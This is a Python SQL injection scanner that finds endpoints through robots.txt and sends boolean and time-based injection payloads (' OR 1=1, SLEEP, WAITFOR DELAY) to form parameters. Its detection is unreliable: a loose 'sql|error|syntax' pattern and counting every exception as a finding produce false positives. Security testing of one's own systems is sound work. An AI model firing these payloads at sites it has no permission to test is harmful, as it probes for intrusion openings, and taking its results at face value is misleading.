import requests
from urllib.parse import urljoin, urlparse
import logging
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

class SQLInjectionTester:
    '''
    A flexible and efficient SQL Injection testing framework.
    Auto-discovers endpoints via robots.txt or fallback to common paths.
    Supports custom payloads, default parameters, concurrent execution, and pattern-based detection.
    '''
    ERROR_PATTERNS = [
        re.compile(p, re.IGNORECASE) for p in [
            r'sql syntax.*?mysql', r'warning.*?mysql',
            r'unclosed quotation mark after the character string',
            r'quoted string not properly terminated', r'sql|error|syntax'
        ]
    ]
    COMMON_ENDPOINTS = ['/', '/login', '/search', '/register', '/api/login-json']
    # Class-level default parameters for testing
    DEFAULT_PARAMS = {'username': 'admin', 'password': 'pass'}

    def __init__(
        self,
        base_url: str,
        endpoints: list = None,
        timeout: float = 5.0,
        max_workers: int = 10
    ):
        '''Initialize tester, auto-discover endpoints if none provided, use class defaults.'''        
        # Normalize base URL
        parsed = urlparse(base_url)
        scheme = parsed.scheme or 'http'
        netloc = parsed.netloc or parsed.path
        self.base_url = f"{scheme}://{netloc.rstrip('/')}/"

        # Session and settings
        self.session = requests.Session()
        self.timeout = timeout
        self.max_workers = max_workers

        # Setup HTTPAdapter pool to match max_workers
        from requests.adapters import HTTPAdapter
        adapter = HTTPAdapter(
            pool_connections=max_workers,
            pool_maxsize=max_workers
        )
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)

        # Determine endpoints
        self.endpoints = endpoints or self._discover_endpoints() or self.COMMON_ENDPOINTS

        # Use class default parameters
        self.default_params = self.DEFAULT_PARAMS

        # Payload definitions
        self.payloads = {
            'single_quote': "'",
            'double_quote': '"',
            'inline_comment': '/*comment*/',
            'dash_comment': '-- ',
            'open_paren': '(',
            'close_paren': ')',
            'boolean_true': "' OR 1=1-- ",
            'boolean_false': "' AND 1=2-- ",
            'time_delay': "' WAITFOR DELAY '0:0:5'-- ",
            'time_sleep': "' SLEEP(5)-- ",
            'time_delay_false': "' WAITFOR DELAY '0:0:0'-- ",
            'time_sleep_false': "' SLEEP(0)-- "
        }

    def _discover_endpoints(self) -> list:
        '''Attempt to fetch /robots.txt and parse Disallow entries.'''        
        try:
            url = urljoin(self.base_url, 'robots.txt')
            resp = self.session.get(url, timeout=self.timeout)
            paths = []
            if resp.status_code == 200:
                for line in resp.text.splitlines():
                    if line.strip().lower().startswith('disallow:'):
                        path = line.split(':', 1)[1].strip()
                        if path and '*' not in path:
                            paths.append(path)
            return sorted(set(paths))
        except Exception:
            return []

    def _build_url(self, path: str) -> str:
        return urljoin(self.base_url, path.lstrip('/'))

    def _post(self, url: str, data: dict) -> requests.Response:
        return self.session.post(url, data=data, timeout=self.timeout)

    def _detect_error(self, text: str) -> bool:
        return any(p.search(text) for p in self.ERROR_PATTERNS)

    def _run_payload_test(
        self,
        endpoint: str,
        param: str,
        base_params: dict,
        payload_name: str,
        payload: str
    ) -> dict:
        '''Execute one payload test against an endpoint and parameter.'''
        url = self._build_url(endpoint)
        data = base_params.copy()
        data[param] = payload
        result = {
            'endpoint': endpoint,
            'param': param,
            'payload_name': payload_name,
            'vulnerability': False,
            'status_code': None,
            'response_time': None
        }
        try:
            resp = self._post(url, data)
            result['status_code'] = resp.status_code
            result['response_time'] = resp.elapsed.total_seconds()
            # Detect error signatures or server failure
            if self._detect_error(resp.text) or resp.status_code >= 500:
                result['vulnerability'] = True
            # Time-based detection
            if 'time' in payload_name and result['response_time'] >= self.timeout - 0.5:
                result['vulnerability'] = True
        except Exception as e:
            logging.warning(f'Error testing {endpoint} param={param}: {e}')
            result['vulnerability'] = True
        return result

    def run_tests(self, params: dict = None, payloads: list = None) -> dict:
        '''Run tests concurrently. Uses class default_params if none provided.'''
        params = params or self.default_params
        if not params:
            raise ValueError('No parameters provided for SQL injection testing.')
        payloads = payloads or list(self.payloads.keys())
        summary = {name: False for name in payloads}
        futures = []
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            for endpoint in self.endpoints:
                for param in params:
                    for name in payloads:
                        futures.append(
                            executor.submit(
                                self._run_payload_test,
                                endpoint, param, params,
                                name, self.payloads[name]
                            )
                        )
            for f in as_completed(futures):
                res = f.result()
                if res['vulnerability']:
                    summary[res['payload_name']] = True
        return summary

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    # Instantiate with no need to pass default_params
    tester = SQLInjectionTester(
        base_url='127.0.0.1:5000',
        timeout=5.0,
        max_workers=20
    )
    # Run tests using class DEFAULT_PARAMS
    results = tester.run_tests()
    for payload, vuln in results.items():
        print(f"{payload} - vulnerability : {vuln}")